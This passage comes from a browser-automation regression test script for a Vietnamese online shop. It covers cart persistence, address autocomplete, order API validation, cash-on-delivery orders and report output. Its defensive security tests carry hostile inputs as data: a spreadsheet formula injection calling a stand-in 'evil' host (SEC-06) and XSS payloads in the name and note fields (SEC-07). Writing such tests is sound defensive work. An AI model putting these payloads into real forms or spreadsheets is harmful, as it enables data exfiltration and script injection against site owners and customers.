  return expect(q1 === "2,1" && n === 1, `after+reload=${q1} afterRemove=${n}`);
});
await test("CANCEL-01", "Rời checkout giữa chừng: giỏ hàng vẫn còn nguyên", async () => {
  await go("/checkout");
  await fillCheckout({ name: "Bỏ dở giữa chừng" });
  await go("/san-pham");
  await go("/gio-hang");
  return expect((await cartLines()).length === 1, `cart=${(await cartLines()).length}`);
});
await test("CO-ADDR", "Checkout: gõ không dấu 'ha noi' -> chọn Thành phố Hà Nội; 'ba dinh' -> Phường Ba Đình; không còn ô Quận/Huyện", async () => {
  await go("/");
  await setCart([{ id: PC, name: "x", variant: "Lao động", price: 30000, qty: 1 }]);
  await go("/checkout");
  await page.waitForFunction(() => document.querySelector('input[role="combobox"]'));
  const field = (label) => page.evaluateHandle((l) => [...document.querySelectorAll("form label")].find((x) => x.textContent.trim().startsWith(l)).querySelector("input"), label);
  const pickOpt = async (label, typed, want) => {
    const el = (await field(label)).asElement();
    await el.click();
    await el.type(typed);
    await sleep(300);
    const opts = await page.evaluate(() => [...document.querySelectorAll('[role="option"]')].map((o) => o.textContent));
    if (!opts.includes(want)) throw new Error(`${typed}: ${opts.slice(0, 5)}`);
    await page.evaluate((w) => [...document.querySelectorAll('[role="option"]')].find((o) => o.textContent === w).dispatchEvent(new MouseEvent("mousedown", { bubbles: true })), want);
    await sleep(200);
    return page.evaluate((e) => e.value, el);
  };
  await sleep(800); // province list loads
  const p = await pickOpt("Tỉnh", "ha noi", "Thành phố Hà Nội");
  const w = await pickOpt("Phường", "ba dinh", "Phường Ba Đình");
  const district = await page.evaluate(() => [...document.querySelectorAll("form label")].some((l) => /Quận/.test(l.textContent)));
  return expect(p === "Thành phố Hà Nội" && w === "Phường Ba Đình" && !district, JSON.stringify({ p, w, district }));
});
await test("CANCEL-02", "Giỏ trống -> checkout báo 'Giỏ hàng trống', không có form đặt", async () => {
  await resetStorage();
  await go("/checkout");
  return expect((await bodyHas("Giỏ hàng trống")) && !(await page.$("form input")), "form still shown");
});

// ================= 7. API đặt hàng: chặn dữ liệu xấu (an toàn trên prod: mọi request đều phải bị từ chối) =================
for (const [id, name, body, want] of [
  ["SEC-02", "JSON hỏng -> 400", "{not json", 400],
  ["SEC-03", "Honeypot (bot điền ô ẩn) -> 400", { ...customer, website: "http://spam", items: [item()] }, 400],
  ["VAL-01", "SĐT sai -> 422", { ...customer, phone: "12345", items: [item()] }, 422],
  ["VAL-02", "Thiếu địa chỉ -> 422", { ...customer, address: "", items: [item()] }, 422],
  ["VAL-03", "Giỏ rỗng -> 422", { ...customer, items: [] }, 422],
  ["VAL-04", "Sản phẩm không tồn tại -> 422", { ...customer, items: [item({ id: "khong-co" })] }, 422],
  ["VAL-05", "Số lượng 0 -> 422", { ...customer, items: [item({ qty: 0 })] }, 422],
  ["VAL-06", "Số lượng 100 (quá 99) -> 422", { ...customer, items: [item({ qty: 100 })] }, 422],
  ["VAL-06b", "Số lượng 26 (đơn sỉ, ảnh lỗi 03/10) -> 200", { ...customer, items: [item({ qty: 26 })] }, 200],
  ["VAL-07", "Số lượng lẻ 1.5 -> 422", { ...customer, items: [item({ qty: 1.5 })] }, 422],
  ["VAL-08", "31 dòng hàng -> 422", { ...customer, items: Array.from({ length: 31 }, () => item()) }, 422],
  ["VAL-09", "Sản phẩm hết hàng -> 422", { ...customer, items: [item({ id: "so-nghi-di", variant: "" })] }, 422],
  ["VAL-10", "Email sai -> 422", { ...customer, email: "abc@", items: [item()] }, 422],
]) {
  await test(id, name, async () => { const r = await order(body); return expect(r.status === want, `status=${r.status} ${(await r.text()).slice(0, 120)}`); });
}
await test("SEC-04", "GET /api/orders không được phép (405)", async () => expect((await fetch(`${BASE}/api/orders`)).status === 405, "not 405"));
await test("VAL-11", "Form báo lỗi SĐT sai ngay dưới ô nhập", async () => {
  await go("/");
  await setCart([{ id: PC, name: "x", variant: "Lao động", price: 30000, qty: 1 }]);
  await go("/checkout");
  await fillCheckout({ ...customer, phone: "123" });
  await throttle();
  await submitCheckout();
  await sleep(2000);
  return expect(await bodyHas("Số điện thoại chưa đúng"), "no field error");
});

// ================= 8. Đặt hàng thật (chỉ local, Sheet giả) =================
if (LOCAL) {
  const seed = async (lines) => { await go("/"); await page.evaluate((l) => { localStorage.setItem("ticco-cart", JSON.stringify(l)); sessionStorage.clear(); }, lines); };
  const place = async (extra = {}) => {
    await go("/checkout");
    await fillCheckout({ ...customer, ...extra });
    await submitCheckout();
    await page.waitForFunction(() => /Đặt hàng thành công|Chưa gửi được|thử lại/.test(document.body.innerText), { timeout: 20000 });
  };
  const one = [{ id: PC, name: "x", variant: "Lao động", price: 30000, qty: 1 }];

  await test("ORD-01", "Đặt hàng: màn tổng quan + mã đơn + tổng đúng; Sheet nhận giá đúng dù giỏ bị sửa giá", async () => {
    sheet.rows.length = 0;
    await seed([{ id: PC, name: "Postcard", variant: "Lao động", price: 1, qty: 2 }, { id: PC, name: "Postcard", variant: "BST 5 tấm", price: 1, qty: 1 }]);
    await place();
    await sleep(800);
    const t = await page.evaluate(() => document.querySelector("main").innerText);
    const row = sheet.rows.at(-1);
    const left = (await cartLines()).length;
    return expect(/Đặt hàng thành công/.test(t) && /TC[0-9A-Z]{8}/.test(t) && /210\.000/.test(t) && row?.total === 210000 && row.items[0].price === 30000 && left === 0,
      `sheet total=${row?.total} cartLeft=${left} text=${t.slice(0, 200).replace(/\n/g, " ")}`);
  });
  await test("ORD-02", "Tải lại trang sau khi đặt vẫn thấy thông tin chuyển khoản", async () => {
    await page.reload({ waitUntil: "networkidle2" });
    return expect(await bodyHas("Đặt hàng thành công"), "lost");
  });
  await test("ORD-03", "Đặt xong, mua tiếp, vào checkout -> form đơn MỚI (không kẹt ở đơn cũ) (BUG-009)", async () => {
    await setCart(one);
    await go("/checkout");
    return expect(!!(await page.$('input[autocomplete="name"]')), "vẫn hiện màn đơn cũ, khách không đặt được đơn mới");
  });
  await test("ORD-04", "Miễn phí ship khi đơn >= 500k", async () => {
    const r = await (await order({ ...customer, items: [item({ variant: "BST 5 tấm", qty: 5 })] })).json();
    return expect(r.subtotal === 600000 && r.shipping === 0 && r.total === 600000, JSON.stringify(r));
  });
  await test("ORD-05", "COD: Sheet nhận đơn ghi [COD] + payment=cod", async () => {
    sheet.rows.length = 0;
    const r = await order({ ...customer, payment: "cod", note: "giao giờ HC", items: [item()] });
    const c = sheet.rows.at(-1)?.customer ?? {};
    return expect(r.status === 200 && c.payment === "cod" && c.note === "[COD] giao giờ HC", `status=${r.status} ${JSON.stringify(c)}`);
  });
  await test("ORD-06", "COD trên form: màn đặt xong báo thu tiền khi giao, không hiện mã QR", async () => {
    await seed(one);
    await go("/checkout");
    await fillCheckout(customer);
    await page.click('input[name="payment"][value="cod"]');
    await submitCheckout();
    await page.waitForFunction(() => /Đặt hàng thành công|Chưa gửi được|thử lại/.test(document.body.innerText), { timeout: 20000 });
    const qr = await page.$('img[src*="qr-thanh-toan"]');
    return expect((await bodyHas("Thanh toán khi nhận hàng (COD)")) && !qr, `qr=${!!qr}`);
  });
  await test("SEC-05", "Giá giả gửi từ client bị bỏ qua (server tự tính)", async () => {
    const r = await (await order({ ...customer, items: [{ ...item(), price: 1, priceFrom: 1 }], subtotal: 1, total: 1 })).json();
    return expect(r.subtotal === 30000 && r.total === 60000, JSON.stringify(r));
  });
  await test("SEC-06", "Chèn công thức vào Sheet bị vô hiệu (= + - @ -> chữ thường)", async () => {
    sheet.rows.length = 0;
    await order({ ...customer, name: '=IMPORTXML("http://evil","//a")', address: "+84 cong thuc", note: "@SUM(A1)", items: [item()] });
    const c = sheet.rows.at(-1)?.customer ?? {};
    return expect(c.name?.startsWith("'=") && c.address?.startsWith("'+") && c.note?.startsWith("'@") && c.phone === "0900000000", JSON.stringify(c));
  });
  await test("SEC-07", "XSS trong tên/ghi chú: giao diện không chạy script", async () => {
    dialogs.length = 0;
    await seed(one);
    await place({ name: "<img src=x onerror=alert(1)>", note: "<script>alert(2)</script>" });
    await sleep(500);
    return expect(!dialogs.length, `dialogs=${dialogs}`);
  });
  await test("CANCEL-03", "Sheet lỗi -> khách thấy báo lỗi, giỏ hàng GIỮ NGUYÊN để thử lại", async () => {
    sheet.mode = "down";
    await seed(one);
    await place();
    const s = { err: await bodyHas("Chưa gửi được đơn hàng"), cart: (await cartLines()).length };
    sheet.mode = "ok";
    return expect(s.err && s.cart === 1, JSON.stringify(s));
  });
  await test("SEC-09", "Chống spam: đơn thứ 7 trong 1 phút từ 1 IP -> 429", async () => {
    let last;
    for (let i = 0; i < 7; i++) last = await order({ ...customer, phone: "123", items: [item()] }, "10.9.9.9");
    return expect(last.status === 429, `7th status=${last.status}`);
  });
}

await test("CON-01", "Không có lỗi JS trong console trên các trang đã mở", async () => {
  const real = consoleErrors.filter((e) => !/Failed to load resource/.test(e));
  return expect(!real.length, real.slice(0, 3).join(" || "));
});

// ---------- report ----------
await browser.close();
stopServer();
const failed = results.filter((r) => !r.pass);
const md = [
  `# Regression — ${new Date().toISOString().slice(0, 16).replace("T", " ")} UTC`,
  "",
  `Target: ${BASE} (${LOCAL ? "local, full incl. orders on a mock Sheet" : "production, read-only"})`,
  `Result: **${results.length - failed.length}/${results.length} pass**`,
  "",
  "| | ID | Case | Chi tiết |",
  "|---|---|---|---|",
  ...results.map((r) => `| ${r.pass ? "✅" : "❌"} | ${r.id} | ${r.name} | ${r.detail.replace(/\|/g, "/").replace(/\n/g, " ").slice(0, 200)} |`),
].join("\n");
writeFileSync("qa/regression-last-run.md", md + "\n");
console.log(`\n${results.length - failed.length}/${results.length} pass -> qa/regression-last-run.md`);
process.exit(failed.length ? 1 : 0);
